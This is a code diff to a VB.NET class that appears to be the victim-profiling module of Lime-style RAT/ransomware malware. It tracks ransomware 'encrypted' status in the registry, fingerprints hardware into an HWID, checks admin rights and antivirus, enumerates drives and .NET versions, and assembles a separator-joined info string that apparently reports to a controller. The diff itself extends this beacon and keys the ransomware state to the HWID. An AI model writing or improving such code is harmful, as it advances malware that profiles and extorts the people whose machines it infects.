@@ -46,9 +46,9 @@ Public Class ID
             Dim id As Security.Principal.WindowsIdentity = Security.Principal.WindowsIdentity.GetCurrent()
             Dim p As Security.Principal.WindowsPrincipal = New Security.Principal.WindowsPrincipal(id)
             If p.IsInRole(Security.Principal.WindowsBuiltInRole.Administrator) Then
-                Return "Administrator"
+                Return "Running as administrator"
             Else
-                Return "User"
+                Return "Running as user"
             End If
         Catch ex As Exception
             Return "Error"
@@ -68,7 +68,6 @@ Public Class ID
         Try
             Dim tohash As String = Identifier("Win32_Processor", "ProcessorId")
             tohash += "-" & Identifier("Win32_BIOS", "SerialNumber")
-            tohash += "-" & Identifier("Win32_DiskDrive", "Signature")
             tohash += "-" & Identifier("Win32_BaseBoard", "SerialNumber")
             tohash += "-" & Identifier("Win32_VideoController", "Name")
             Return MD5HASH(tohash)
@@ -113,10 +112,10 @@ Public Class ID
 
     Public Shared Function Ransomeware()
         Try
-            Dim readValue = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", "Ransome-Status", Nothing)
-            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Lime", "Ransome-Status", Nothing) Is Nothing Then
+            Dim readValue = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\" + ID.HWID, "Ransome-Status", Nothing)
+            If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\" + ID.HWID, "Ransome-Status", Nothing) Is Nothing Then
                 My.Computer.Registry.CurrentUser.CreateSubKey("Software\Lime")
-                My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Lime", "Ransome-Status", "Not encrypted")
+                My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\" + ID.HWID, "Ransome-Status", "Not encrypted")
                 Return "Not encrypted"
             Else
                 Return readValue
@@ -132,7 +131,7 @@ Public Class ID
             For Each drive In Environment.GetLogicalDrives
                 Dim Driver As IO.DriveInfo = New IO.DriveInfo(drive)
                 If Driver.DriveType = IO.DriveType.Fixed Then
-                    sb.Append(drive.ToString + " ")
+                    sb.Append(drive.ToString + "  ")
                 End If
             Next
             Return sb.ToString
@@ -284,15 +283,15 @@ Public Class ID
         Try
             Dim v As New Text.StringBuilder
             For Each Folder In IO.Directory.GetDirectories((IO.Path.GetPathRoot(Environment.GetLogicalDrives(Environment.SpecialFolder.Desktop)) + "Windows\Microsoft.NET\Framework\"))
-                v.Append(IO.Path.GetFileName(Folder) + " + ")
+                v.Append(IO.Path.GetFileName(Folder) + "  ")
             Next
             Dim str As String = v.ToString
 
             Dim re As New Text.StringBuilder
-            Dim s As String() = Split(str, " + ")
+            Dim s As String() = Split(str, "  ")
             For i As Integer = 0 To s.Length
                 Try
-                    re.Append(s(i).Remove(4) + " + ")
+                    re.Append(s(i).Remove(4) + "  ")
                 Catch ex As Exception
                 End Try
             Next
@@ -321,9 +320,9 @@ Public Class ID
             LastReboot() & SPL &
             AV() & SPL &
             MachineType() & SPL &
-            DotNET() & SPL
-
-
+            DotNET() & SPL &
+            ListDrivers() & SPL &
+            HWID() & SPL
         Catch
             Return "N/A"
         End Try
